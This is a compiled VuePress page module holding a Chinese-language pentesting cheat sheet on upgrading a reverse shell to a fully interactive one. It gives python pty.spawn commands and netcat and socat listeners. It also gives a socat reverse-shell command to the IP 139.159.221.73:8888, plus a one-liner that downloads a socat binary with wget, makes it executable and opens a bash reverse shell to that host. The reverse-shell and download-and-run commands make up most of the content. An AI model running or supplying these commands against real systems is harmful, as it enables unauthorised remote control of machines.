import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as n,e}from"./app-2f12e8a4.js";const t={},p=e(`<h2 id="有python" tabindex="-1"><a class="header-anchor" href="#有python" aria-hidden="true">#</a> 有python</h2><h2 id="python" tabindex="-1"><a class="header-anchor" href="#python" aria-hidden="true">#</a> Python</h2><p>提升为完全交互式终端</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#检测python版本</span>
which python python2 python3

<span class="token comment"># 提升为半交互式终端</span>
python <span class="token operator">-</span>c <span class="token string">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> export SHELL<span class="token operator">=</span>bash <span class="token operator">&amp;</span><span class="token operator">&amp;</span> export TERM<span class="token operator">=</span>xterm<span class="token operator">-</span>256color

<span class="token comment"># python3/python2</span>
python3 <span class="token operator">-</span>c <span class="token string">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> export SHELL<span class="token operator">=</span>bash <span class="token operator">&amp;</span><span class="token operator">&amp;</span> export TERM<span class="token operator">=</span>xterm<span class="token operator">-</span>256color

python2 <span class="token operator">-</span>c <span class="token string">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> export SHELL<span class="token operator">=</span>sh <span class="token operator">&amp;</span><span class="token operator">&amp;</span> export TERM<span class="token operator">=</span>xterm<span class="token operator">-</span>256color
 ​  
<span class="token comment"># 将shell发送到后台  </span>
Ctrl<span class="token operator">+</span>Z

<span class="token comment"># 设置 shell 以通过反向 shell 发送控制字符和其他原始输入, 最终为完全交互式. </span>
stty raw <span class="token operator">-</span>echo<span class="token punctuation">;</span>fg
 ​  
<span class="token comment"># 上面两步可以直接用下方监听代替(解决键盘输入，如上下左右等)</span>
rlwrap nc <span class="token operator">-</span>lvnp <span class="token number">8888</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="无python-socat" tabindex="-1"><a class="header-anchor" href="#无python-socat" aria-hidden="true">#</a> 无python(Socat)</h2><p>Socat交互式：</p><p>监听</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>socat file:\`tty\`,raw,echo=0 tcp-listen:8888
nc -lvvp 8888也可以，但是只能半交互式
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>反弹</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>socat TCP:139.159.221.73:8888 EXEC:&#39;/bin/bash&#39;,pty,stderr,setsid,sigint,sane
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>一键反弹（远程下载socat,要求能访问github,或者自行python开启http）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:139.159.221.73:8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,12),o=[p];function r(i,l){return a(),n("div",null,o)}const m=s(t,[["render",r],["__file","提升为完全交互式的shell.html.vue"]]);export{m as default};
